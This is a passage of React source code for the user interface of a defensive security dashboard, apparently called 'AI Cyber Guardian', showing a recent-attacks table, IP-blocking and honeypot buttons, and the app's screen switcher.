                      background: `linear-gradient(90deg, ${T.critical}, ${T.purple})`,
                      borderRadius: 4,
                    }}
                  />
                </div>
              </div>
            </Card>
          </div>
        </div>

        {/* Recent attacks */}
        <Card>
          <PanelTitle icon="🕐" title="RECENT ATTACKS" />
          <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse" }}>
            <thead>
              <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                {["Time", "Method", "Endpoint", "Attack Type", "Severity", "Score", "Action"].map((h) => (
                  <th
                    key={h}
                    style={{ color: T.muted, padding: "0 8px 8px", textAlign: "left", fontWeight: 500, fontSize: 11 }}
                  >
                    {h}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody>
              {recentAttacks.map((e, i) => (
                <tr key={i} style={{ borderBottom: `1px solid ${T.border}20` }}>
                  <td style={{ padding: "7px 8px", fontFamily: "monospace", color: T.muted, fontSize: 11 }}>
                    {e.time}
                  </td>
                  <td style={{ padding: "7px 8px" }}>
                    <span
                      style={{
                        background: T.surface2,
                        padding: "1px 6px",
                        borderRadius: 3,
                        fontSize: 10,
                        color: T.blue,
                        fontFamily: "monospace",
                      }}
                    >
                      {e.method}
                    </span>
                  </td>
                  <td style={{ padding: "7px 8px", fontFamily: "monospace", fontSize: 11, color: T.text }}>
                    {e.path}
                  </td>
                  <td style={{ padding: "7px 8px" }}>
                    <span style={{ background: T.surface2, padding: "1px 6px", borderRadius: 3, fontSize: 11 }}>
                      {e.type}
                    </span>
                  </td>
                  <td style={{ padding: "7px 8px" }}>
                    <Badge level={e.level} small />
                  </td>
                  <td style={{ padding: "7px 8px", minWidth: 90 }}>
                    <ScoreBar score={e.score} compact />
                  </td>
                  <td style={{ padding: "7px 8px" }}>
                    <span
                      style={{
                        fontSize: 11,
                        color: e.level === "CRITICAL" ? T.purple : e.level === "HIGH" ? T.critical : T.muted,
                      }}
                    >
                      {e.action}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>

          <div style={{ display: "flex", gap: 8, marginTop: 16 }}>
            <Btn
              danger
              disabled={blocked}
              onClick={() => {
                onBlockIP(attacker.ip);
                setBlocked(true);
                alert(`IP ${attacker.ip} has been permanently blocked!`);
              }}
            >
              {blocked ? "✓ Blocked Permanently" : "Block IP Permanently"}
            </Btn>
            <Btn onClick={() => alert("Redirecting to active virtual shell session...")}>
              View Honeypot Session
            </Btn>
            <Btn onClick={() => alert("STIX 2.1 Threat Profile JSON downloaded.")}>
              Export Profile (STIX 2.1)
            </Btn>
          </div>
        </Card>
      </div>
    </div>
  );
}

// ── Root Master Component ──────────────────────────────────────────────────
export default function AICyberGuardianApp() {
  const [screen, setScreen] = useState("dashboard");
  const [selectedAttackerIP, setSelectedAttackerIP] = useState(null);

  useEffect(() => {
    document.body.style.margin = "0";
    document.body.style.padding = "0";
    document.body.style.background = T.bg;
    document.body.style.fontFamily = "'Inter', system-ui, -apple-system, sans-serif";
  }, []);

  const screens = [
    { id: "landing", label: "🏠 Landing" },
    { id: "login", label: "🔐 Login" },
    { id: "dashboard", label: "📊 Dashboard" },
  ];

  return (
    <div style={{ background: T.bg, minHeight: "100vh", color: T.text, position: "relative" }}>
      {/* Screen Switcher Floating Bottom Bar (Matching User Wireframe & Images) */}
      <div
        style={{
          position: "fixed",
          bottom: 16,
          left: "50%",
          transform: "translateX(-50%)",
          zIndex: 9999,
          display: "flex",
          alignItems: "center",
          gap: 6,
          background: `${T.surface}ee`,
          backdropFilter: "blur(8px)",
          border: `1px solid ${T.border}`,
          borderRadius: 30,
          padding: "6px 12px",
          boxShadow: "0 4px 24px rgba(0,0,0,0.6)",
        }}
      >
        {screens.map((s) => (
          <button
            key={s.id}
            onClick={() => {
              setScreen(s.id);
              setSelectedAttackerIP(null);
            }}
            style={{
              padding: "5px 14px",
              background: screen === s.id && !selectedAttackerIP ? T.blue : "transparent",
              color: screen === s.id && !selectedAttackerIP ? "#0D1117" : T.muted,
              border: "none",
              borderRadius: 20,
              cursor: "pointer",
              fontSize: 11,
              fontWeight: 600,
              fontFamily: "inherit",
              transition: "all 0.15s",
            }}
          >
            {s.label}
          </button>
        ))}
        <div style={{ width: 1, height: 16, background: T.border, margin: "0 4px" }} />
        <span style={{ color: T.muted, fontSize: 11, display: "flex", alignItems: "center", paddingRight: 4 }}>
          AI Cyber Guardian UI
        </span>
      </div>

      {/* Screen Routing */}
      {screen === "landing" && !selectedAttackerIP && <Landing onNav={setScreen} />}
      {screen === "login" && !selectedAttackerIP && <Login onNav={setScreen} />}
      {screen === "dashboard" && !selectedAttackerIP && (
        <Dashboard
          onNav={setScreen}
          onOpenAttacker={(ip) => setSelectedAttackerIP(ip)}
        />
      )}
      {selectedAttackerIP && (
        <AttackerProfile
          ip={selectedAttackerIP}
          onBack={() => setSelectedAttackerIP(null)}
          onBlockIP={(ip) => apiBlockIP(ip, "Manual permanent block")}
        />
      )}

      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap');
        * { box-sizing: border-box; }
        ::-webkit-scrollbar { width: 5px; height: 5px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: ${T.border}; border-radius: 3px; }
        input::placeholder, select::placeholder { color: ${T.muted} !important; }
        input, select { color: ${T.text} !important; }
      `}</style>
    </div>
  );
}
